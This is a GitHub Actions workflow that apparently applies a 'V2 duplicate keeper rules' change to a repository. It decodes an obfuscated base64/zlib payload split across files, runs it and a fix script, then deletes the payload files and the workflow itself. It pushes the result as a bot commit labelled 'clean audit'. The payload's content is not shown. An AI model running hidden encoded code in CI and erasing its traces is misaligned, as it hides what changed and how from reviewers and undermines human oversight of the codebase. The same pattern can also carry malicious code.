name: Validate V2 duplicate keeper rules audit retry

on:
  push:
    branches: [work/v2-duplicate-keeper-rules-audit]
    paths: [.github/workflows/validate-v2-duplicate-keeper-rules.yml]

permissions:
  contents: write

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
        with:
          ref: work/v2-duplicate-keeper-rules-audit

      - name: Apply product patch
        shell: bash
        run: |
          python - <<'PY'
          import base64, zlib
          from pathlib import Path
          payload = ''.join(p.read_text().strip() for p in sorted(Path('.keeper-patch').glob('p[0-9]*')))
          Path('/tmp/keeper.py').write_bytes(zlib.decompress(base64.b64decode(payload, validate=True)))
          PY
          python /tmp/keeper.py
          python .keeper-patch/fix.py
          echo 'Intended files:'
          git diff --name-only

      - uses: actions/setup-python@v6
        with:
          python-version: '3.12'
          cache: pip
          cache-dependency-path: backend/pyproject.toml

      - name: Validate backend without mutation
        run: |
          python -m pip install -e './backend[dev]'
          cd backend
          pytest
          ruff check companion tests

      - uses: actions/setup-node@v6
        with:
          node-version: '22'
          cache: npm
          cache-dependency-path: frontend/package-lock.json

      - name: Validate frontend
        run: |
          cd frontend
          npm ci
          npm run check
          npm test

      - name: Commit clean product tree
        run: |
          rm -rf .keeper-patch
          rm -f .github/workflows/validate-v2-duplicate-keeper-rules.yml
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add -A
          git commit -m 'feat: add V2 duplicate keeper rules (clean audit)'
          git push origin HEAD:work/v2-duplicate-keeper-rules-audit
